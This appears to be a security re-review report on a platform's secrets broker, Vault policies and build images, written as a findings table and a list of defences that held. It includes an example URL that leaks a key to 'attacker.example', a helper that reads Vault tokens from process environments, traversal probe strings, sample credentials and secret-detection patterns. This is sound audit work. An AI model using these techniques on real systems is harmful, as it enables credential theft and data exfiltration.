# R2 — adversarial re-review of slice-1g fixes B88, B89, B90, B92, B93, B80/B94

Reviewer: independent (did not build or first-review this code). Findings only — no code, config, policy, compose, git,
container or Vault state was changed. Live probing used each service's own Vault token (`/proc/1/environ`), the root
token only for READS (`vault policy read`, `vault list`, `auth/approle/role/<r>` read), identity `/login` with the dev
fixture `conformance/.creds.json`, read-only `psql` SELECTs, and BuildKit probe builds with `--output type=cacheonly`.
One transient file (`/tmp/r2/p.py`, a URL-parse test) was written in the secrets container and removed in the same command.
An HTTP probe that included broker WRITE routes (`/set`, `/copy`, `/admin/provider-key`) was blocked by the harness and
NOT run. Only read and gate probes ran.

Helper used throughout (`env.sh` in this folder):
`tok(){ docker exec airawat-ld-$1 sh -c 'tr "\0" "\n" </proc/1/environ | grep ^VAULT_TOKEN= | cut -d= -f2-'; }`
`vc(){ docker exec -e VAULT_ADDR=http://127.0.0.1:8200 -e VAULT_TOKEN="$1" airawat-ld-vault vault "${@:2}"; }`

## Findings

| ID | Sev | Title | Evidence | Owning layer | Blocks L1 exit |
|---|---|---|---|---|---|
| R2-1 | **Med** | **`/fetch` `inject.as=template` lets a component send its own secret to an undeclared host, and the audit records the declared host.** The kernel checks `urlparse(url).hostname` against declared egress before the placeholder is substituted. The component chooses the placeholder (and `safe`), so the substitution can rewrite the authority. The B90 "no redirects" fix does not cover this route. | Command: `docker exec airawat-ld-secrets python3 -I /tmp/r2/p.py` (Python 3.11.18, the broker's own urllib). `url="https://x@good.com/.attacker.example/path"`, placeholder `"x@good.com/"`. Kernel/secrets `urlparse(...).hostname` = `good.com`, so it passes the egress check. After `url.replace(ph, quote(key, safe=""))`, urllib connects to `('SECRETKEY123.attacker.example', 443)`, so the key leaks as a DNS label and SNI to an attacker zone. `kernel/api/app.py:1621-1667` passes `inject` through verbatim. `platform-spec/reference/secrets.py:229-231` substitutes after the check. `_audit_egress` and `fetched_host` both use the pre-substitution host. **Not exploitable on local-dev today:** `airawat-ld-secrets` is only on `aos-data-secrets` and `aos-svc` (internal). `socket.create_connection(("1.1.1.1",443))` gives `Network is unreachable` and DNS fails. Any install that gives the broker egress (its purpose) is exposed. | L6 (secrets broker) + L2 (kernel `/v1/fetch` should refuse a `template` placeholder overlapping the scheme/authority, or re-check the host after substitution) | no (dev broker has no egress). Must close before the broker gets egress. |
| R2-2 | **Med** | **PLT-5 reads HELD in STATUS-MATRIX while its spec says PARTIAL.** This is the same class as M3, and the first review missed it too (§7 line 108 lists PLT-5 among "HELD after this review"). `verify/known_violations.py` has no case for it. | `grep -n "| HELD |" docs/specs/STATUS-MATRIX.md` gives FND-19, PLT-5, ARC-1, ARC-3, ARC-5, ARC-7. `docs/specs/PLATFORM-v0.1.md:259` has `\| PLT-5 \| platform.authority recorded, never zero, SoD \| PARTIAL \| ADR-0122; DEBT-A17 \|`, and the tally on line 279 lists PLT-5 under "10 PARTIAL". `PLATFORM-v0.1.md:63`: "The fix is PLT-5 … — PLANNED". The other five HELD rows agree with their specs (FND-19 "BUILT (slice-1d)"; ARC-1/3/5/7 "HELD (network layer)" in ARCHITECTURE-FLOWS §114-120). | L4 (rule: platform authority) / L1 (matrix net) | **yes.** The exit gate reads "owned rows HELD", and M3 was blocking for the same reason. |
| R2-3 | **Med** | **LITERAL_SECRET_OR_GATE still misses the compose list form, which N3 named and the DEBT-B92 row marks "N3 FIXED".** It also misses plain Python constants, dict literals, `os.environ[...] = "lit"`, `setdefault`, JSON/TOML/INI files, `local/readonly/declare` shell forms, `curl -u user:pw`, and Dockerfile `ENV DB_PASS=`. | The real `check_literal_gates()` was run over a fake tree, with the file-type gating the checker applies (monkeypatched `files`/`lines`). **MISSED:** `x.yml: "      - DB_PASSWORD=kernel"` and `- "VAULT_TOKEN=hvs.abc"`. `SECRET_ASSIGN_YAML` anchors `-?` at column 0, so an indented compose list item never matches. YAML anchor/alias (`x: &pw hunter2` / `DB_PASSWORD: *pw`) is also missed. `x.py` misses: `DB_PASSWORD = "kernel"`, `VAULT_TOKEN = "hvs.CAESIabc"`, `os.environ.setdefault("DB_PASSWORD","kernel")`, `os.environ["VAULT_TOKEN"]="root"`, `psycopg2.connect("… password=kernel …")`, `headers={"Authorization":"Bearer abc.def.ghi"}`, `creds={"password":"Airawat@123"}`, `_PW="Airawat@123"`. `x.sh` misses: `curl -u admin:hunter2`, `local/readonly/declare -x DB_PASSWORD=kernel`. Also missed: `x.json`, `x.toml`, `x.ini` (no check reads these), Dockerfile `ENV DB_PASS=kernel` (name not in `_SECRET_NAME`) and `RUN echo hvs.abc > /token`. CAUGHT: `POSTGRES_PASSWORD: kernel` (map form), `or "lit"`, `${X:-lit}`, `export X=lit`, DSN, `ENV PGPASSWORD kernel`. No real occurrence of these forms is in the tracked tree today (grep of 402 tracked config files). gitleaks is the backstop. | L1 (verify net) | no (N3 was non-blocking). The "N3 FIXED" claim must be corrected. |
| R2-4 | Low | **TOKEN_ROLES evadable; exit condition 6's "per-entry debt ids" not delivered.** | Regex test against `verify/banned_patterns.TOKEN_ROLES`. **MISSED:** `claims.get(ROLES_KEY)`, `dict.get(claims,"roles")`, `jmespath.search("roles",claims)`, `match`/`case {"roles": rs}`, `handler(**claims)` with a `roles=` kwarg, `user.roles` / `ctx.roles` / `c.roles` (receiver not in the 15-name list), multi-line `claims.get(\n "roles")`, `"rol" "es"`, `u"roles"`/`r"roles"`/`f"roles"`/`"""roles"""`, `claims.items()` loops, `Claims(**claims).roles`, `scope`/`groups` claims. Only `.py` is scanned, so inline JS in `app_host.py:2560,2701` (`S.roles.includes(...)`) is not counted (client-side). A sweep of the in-scope tree for these forms found no uncounted server-side token-role read. The 140-entry baseline is `file::line → count` with no per-entry debt id; `verify/banned-baseline.json` carries only a global `_meta.note`. Fingerprints are per-file counts, so removing one baselined line and adding an identical one elsewhere in the same file passes. | L1 (verify net) | **yes, narrowly:** exit condition 6 asks for "per-entry debt ids". The regex gaps alone: no. |
| R2-5 | **Med** | **The "reproducible from the repositories" reference image ships an untracked, authority-bearing file plus untracked build artefacts. `build_context_test.py` cannot see this.** | `docker run --rm --entrypoint sh manishsv/airawatos-reference:1g -c 'ls -la /app/reference'` shows `/app/reference/identity-users.json` (6816 B). `git -C platform-spec status --ignored` shows `!! reference/identity-users.json` (gitignored, untracked). Contents: 53 users with `roles`/`tenant`/`contact`, including **5 `platform.tenant-admin`** (e.g. `bmc-admin`). It is identity's **default** `USERS_FILE` (`identity.py:166`) whenever `IDENTITY_USERS_FILE` is unset. Local-dev sets it to `/data/identity/...`, so it is unused here. Also shipped: `/app/components/_common/dist/*.whl,*.tar.gz` and `airawatos_aos.egg-info` (untracked). The allow-list `!platform-spec/reference` / `!components` admits any untracked file. The B94 probe only greps `.env`, `.creds.json`, `init.json`, `approle`, `results`, `*.jsonl`. The image content therefore depends on the builder's workstation, not the recorded `git_revision` (`IMAGES.lock.json` also records only the platform-spec SHA, not the `components/` SHA that is COPYed). | L1 (build) / L3 (identity default seed) | **yes, if B94/§8(a) is adopted as exit condition 10.** Build from a clean checkout (`git archive`) or exclude untracked files, and record the components SHA. |
| R2-6 | Low | Build contexts still carry a private signing seed. | A BuildKit probe build (`--output type=cacheonly`, broader patterns) lists `./trust/contract/.contract_seed` (32-byte Ed25519 private key of the contract-test token minter, `network/trust/contract/mint.py:19`) and `jwks.json` for the **network** and **root** contexts. It is not COPYed into `airawatos-network:1g` (`find /` shows none). The reference context leaks nothing beyond R2-5. `build_context_test.py` does not look for `*seed*`, `id_rsa*`, `.netrc`, `.pgpass`, `*.sqlite`, `*.snap`, `*.tfstate`, `identity-*.json` or `*passwords*`. | L1 (build) / L4 | no |
| R2-7 | Low | Unpinned or unverified build inputs; every image runs as root. | `platform-spec/Dockerfile.reference`: the docker CLI is fetched with `curl -fsSL …docker-${DOCKER_CLI}.tgz` and **no sha256 check**. `apt-get -y upgrade` and unpinned apt packages are acknowledged in the header. `requirements.reference.lock` has 27 `==` pins and **0 hashes** (`--require-hashes` unused). The lock is complete: `pip freeze` in the image adds nothing beyond the lock. No `USER`: `id` in reference/kernel/network images gives `uid=0(root)`, and `docker inspect` `.Config.User` is empty for every service container. | L1 (build) | no (before any non-dev install) |
| R2-8 | **Med** | **Per-actor decision/order signing fails OPEN: decision and workflow have no transit grant.** Pre-existing since slice-1c-ii, not a B88 regression, but B88's transit narrowing and its net did not look at these consumers. | `vc $(tok decision) token capabilities transit/sign/user-kmc-anita` gives `deny`, and likewise for `transit/keys/...`; the same for workflow. `git log` shows `svc-decision.hcl`/`svc-workflow.hcl` never granted transit. `decision.py:97-101` and `workflow.py:107-111` run `signing.sign(...)` inside `except Exception: decision["signature"] = {"error": "signing unavailable: …"}` and **still `_put` the record**. A governance.decision / governance.order is stored unsigned (non-repudiation lost) with no failure. `FAIL_OPEN_GATE` does not catch this shape. No decisions exist on the live stack to show a stored example. | L6 (decision/workflow fail-open) + L1 (policy omits `transit/*/user-*`) | no for L1. Record as debt; it must fail closed or get a scoped `user-<tenant>-*` grant. |
| R2-9 | Low | The identity transit glob grants key administration that the policy comment says it does not. | `vc $(tok identity) token capabilities transit/keys/identity-x/config` and `…/rotate` give `create, read, update`, so `…/trim` is also covered by the glob. `svc-identity.hcl` comment: "No rotate/config (key administration is install-time root)". Commit 909eb88 records this residual only for network `steward-*`. `vault_scope_test.py` checks only `airawat-identity`, `airawat-authority` and `steward-localdev`. Identity can trim old versions of a per-tenant issuer key (breaks verification of older tokens) or set `exportable` / `allow_plaintext_backup` (export and backup endpoints are denied). No `identity-*` keys exist yet (per-tenant issuer off). | L1 (policy) / L3 | no |
| R2-10 | Low | The secret-name validators accept a trailing newline, although the docstring says "no control characters". | Python `re.match` with `$` matches before a final `\n`. The kernel `/v1/fetch` regex and `secret_names._SEGMENT` both accept `"KEY\n"` (`newline passes kernel regex: True`; `check_segment('n','KEY\n')` OK). `check_component("x\n")` gives `t/x%0A/n`. The result is an `http.client.InvalidURL` exception, not traversal: `/fetch` → "not set", while `/set` lets the exception escape `do_POST` (only `BadName` is caught). Use `\Z` or `re.fullmatch`. | L6 / L2 | no |
| R2-11 | Low | The secrets broker's login path still follows redirects, contrary to the B90 claim. | `secrets.py _auth_token` uses `urllib.request.urlopen` (default redirect handler), not `secret_names.OPENER`. For a POST, Python 3.11 follows 301/302/303 as a GET without a body and refuses 307/308, so the credentials are **not** re-sent. A token returned by the redirect target is cached and injected. Not exploitable for credential theft; inconsistent with "no redirects followed". | L6 | no |
| R2-12 | Low | The secret scan can still fail open through the baseline. | `verify/scans.py main()`: under `--update-baseline`, a gitleaks run that did not complete adds `<repo>:SCAN-DID-NOT-RUN` to `found`, which is written into `scan-baseline/gitleaks.json`. On every later run that fingerprint is in `known`, so a scanner that keeps failing reports 0 NEW and PASSes. (`failed += bool(new) and not update` also makes the update run itself green.) The baseline today has 6 findings and no SCAN-DID-NOT-RUN entry. The self-test covers only the missing-image path. | L1 (verify net) | no |
| R2-13 | **Med** (code read, not exercised) | Model-gateway takes the key PATH and the key DESTINATION from a world-readable registry record, so a record naming another tenant's component secret plus an attacker `base_url` would exfiltrate it. B89's mount narrowing does not bound this. | `model_gateway.py _vault_key`: `tn = caller_tenant or prov.get("tenant","kmc")`, and the component and `key_secret` also come from the `intelligence.provider` record. `/complete` and `/embed` pass no caller tenant. The key is sent as a Bearer to `p["base_url"]`. `intelligence.provider` is a public schema (`kernel/api/app.py:1039`), and records are written under the writer's own `ds:<tenant>:` prefix (`_assert_write_own_tenant`); nothing ties the record's `tenant` field to its id. Model-gateway is on `aos-egress` (live `create_connection(("1.1.1.1",443))` succeeded). Not exercised: it would need a registry write, plus an allowed `/complete` caller choosing the model. Whether `_assert_dataplane_writer` restricts this schema to certified components was not confirmed. | L6 (model-gateway) / L2 (registry write governance for `intelligence.provider`) | no |
| R2-14 | Info | K3 residual: three containers hold the sole run-token-reader credential. | `vault token lookup` shows automation and event-relay with policies `['default','svc-scheduler']`, and `SERVICE_PRINCIPAL=scheduler` in all three. Each can read `secret/data/localdev-operator/scheduler/password` and mint as `scheduler`, the only `RUN_TOKEN_READERS` member (`kernel/api/app.py:2465`). Documented in ARCHITECTURE-FLOWS §g line 260. app-host itself is correctly narrowed (K3 fixed for app-host). A per-daemon principal would also make B85's "declared caller = event-relay" distinguishable from the scheduler. | L5/L6 | no |
| R2-15 | Low | Exit condition 8's "add the ARC-3 DB-grant audit as a case" is not met. | `grep -rln "role_table_grants\|has_table_privilege" conformance verify deploy` finds nothing. ARC-3's HELD cases are still the SUPERUSER_DB banned pattern and the flow-map reach (`STATUS-MATRIX.md:237`). Live roles: `kernel` is superuser; `migrator`, `kernel_app`, `network_app` and `identity_lockout` are not (pg_roles). | L1 (matrix net) / L2 | **yes, narrowly** (condition 8 wording) |

## Held (attempted, did not break)

**B88 transit**
- Capability matrix: `vc <svc-token> token capabilities <path>` for identity, network, kernel, secrets, model-gateway and app-host was run over `transit/sign/{airawat-identity,airawat-authority,steward-citizens}`, `transit/hmac/*`, `transit/encrypt/*`, `transit/export/signing-key/airawat-identity`, `transit/backup/*`, `transit/restore/*`, `transit/keys` (LIST), `transit/verify/*`, `transit/datakey/*`, `transit/random`, `transit/cache-config`, and `transit/keys/<k>/{trim,rotate,config}` for every foreign key.
  - Only the owner holds sign on its keys: identity on `airawat-identity` and `identity-*`; network on `airawat-authority` and `steward-*`.
  - hmac, encrypt, export, backup, restore, verify, LIST and random are `deny` for every service.
  - The kernel has no transit grant.
  - HELD.
- Glob overlap: `identity-*` and `steward-*` are disjoint. No service holds another's prefix, so no service can create a key that another service trusts.
  - `signing.key_name` maps `user://` to `user-*`, which no service is granted.
  - HELD.
- Glob traversal: `GET /v1/transit/keys/identity-../airawat-authority`, `identity-%2e%2e/…` and `identity-%2E%2E%2F…` as identity each return `404 unsupported path`.
  - `identity-x/../../transit/keys/airawat-authority` returns `307` to the cleaned path, which is re-authorised (`403` on direct GET).
  - Python urllib does not follow a 307 for a POST.
  - HELD.
- Token minting: `auth/token/create`, `create-orphan`, `auth/approle/role/*/secret-id|role-id`, `auth/token/lookup[-accessor]`, `auth/token/accessors`, `sys/policy/*`, `sys/mounts*` and `sys/raw/*` are `deny` for all six services.
  - Only `default` remains: lookup/renew/revoke-self, cubbyhole, `sys/wrapping/*`, `sys/tools/hash`.
  - HELD.
  - Info: tokens are renewable to `token_max_ttl` 604800 s.
- AppRole cross-login: `VAULT_SECRET_ID` is absent from every service's `/proc/1/environ`; only `VAULT_ROLE_ID` is present.
  - Secret-ids sit only in each container's own `Config.Env` and in 0644 host files. That is K4/B91, already recorded.
  - From inside a container, another role's secret-id is not reachable.
  - HELD within scope.

**B89 brokers**
- Read matrix of all 23 `secret/` paths for 12 service tokens:
  - secrets and model-gateway can read **none**.
  - `trust-plane/audit_hmac` is readable **only by network** (the owner).
  - app-host reads only its own, embed-service, sms-gateway, component-publisher and dev-sandbox paths.
  - HELD.
- Other mounts and paths for secrets, model-gateway and app-host:
  - `secret/localdev/kernel-app/password` (KV v1 form), `secret/metadata/*`, `sys/mounts/components/tune`, `components/config`, `components/destroy/*`, `components/undelete/*` and `components/delete/*`: `deny`.
  - `cubbyhole` is per-token only.
  - HELD.
  - Info: secrets holds `delete` on `components/metadata/*` (permanent delete of every tenant's component secrets), which no broker route uses.
- `vault secrets list` shows `agent-registry/`, `components/`, `cubbyhole/`, `identity/`, `secret/`, `sys/` and `transit/`. The `components/` mount is empty and no platform credential lives there. HELD.
- Live and policy files match: `vault policy read` for the six in-scope policies equals `deploy/local-dev/vault/policies/*.hcl`.
- Cross-tenant HTTP (tokens minted via identity `/login` for opadmin/platform.admin and outsider):
  - secrets `/status` for another tenant and own tenant without a role: `403 tenant-admin for <t> required`. Without a token: 401.
  - `/materialize` and `/fetch` with a user token: `403 wrong audience`. Without a token: `403 a service token addressed to svc:secrets is required`.
  - model-gateway `/transcribe` and `/complete`: `403 wrong audience` / service token required.
  - Write routes were not probed (harness block). Their tenant check is code-identical to `/status`.
  - HELD.

**B90 names**
- `secret_names.check_segment` rejects:
  - fullwidth `．．`
  - `%2e%2e`
  - `;`, `?` and `#`
  - names longer than 128 characters
- `check_component` rejects `a//b`, `a/./b`, `a/b/`, `a%2fb` and `comp/.%00`.
- Only ASCII ranges are allowed, so NFKC lookalikes cannot get through.
- The tenant is taken from the run token, not the caller.
- All Vault reads and writes in `secrets.py` and `model_gateway.py` go through `secret_path` and the no-redirect `OPENER`.
- Other Vault path builders (`svc_token.py`, `identity.py:974-975`, `network/api.py:51`, `kernel/api/svc_identity.py`, `pg_store.py`, `network/kv.py`, `signing.py`) build from env/static config, not request input.
- Parse differentials between `urlparse().hostname` and urllib's connect host (`\@`, `%2523@`, `#@`, `:80@`, tab, CRLF, `[::1]@`) all end in an unresolvable host or InvalidURL. HELD, apart from R2-1 / R2-10 / R2-11.

**B92**
- The self-test passes, and every listed positive form is caught.
- `or "lit"`, `${X:-lit}`, `export X=lit`, the DSN credential, `ENV PGPASSWORD` and the compose map form are caught.
- No `.gitleaks.toml`, `.gitleaksignore` or `gitleaks:allow` exists in any of the 5 repos, so there is no attacker allowlist.
- A missing-image scanner surfaces as SCAN-DID-NOT-RUN (except R2-12).
- No real uncounted token-role or literal-secret occurrence was found in scope. Shipped out-of-scope `components/tools`, `demos`, `adapters`, `connectors` and `governance` contain no literal credential (grep).

**B93**
- NET-3, PTC-1, REG-5 and FND-15 now carry XFAIL and read PARTIAL.
- A broken regex in `known_violations.py` yields XPASS (REVIEW), never HELD.
- FND-19 and ARC-1/3/5/7 HELD agree with their spec status lines.
- Exceptions: PLT-5 (R2-2) and the ARC-3 grant case (R2-15).

**B80/B94**
- The base is pinned by digest in all three Dockerfiles.
- The lock is complete: `pip freeze` in the image adds nothing beyond `requirements.reference.lock`.
- The kernel and network images COPY explicit paths. `.contract_seed`, `.env` and creds are absent from the images.
- A secret-pattern sweep of `/app` in the reference image found none: `grep -rlE "hvs\.|AKIA…|sk-…|BEGIN … PRIVATE KEY"` returned nothing, and no `*.env`, `*creds*`, `*.pem`, `*.key`, `.netrc`, `id_rsa`, `*.sqlite`, `init.json` or `*passwords*` files.
- The reference context excludes `.env`, `approle`, `.creds.json`, `init.json` and results (allow-list).
- Shipped `.ingest-logs` and `.onboard-logs` are tracked and contain no token, password or JWT.
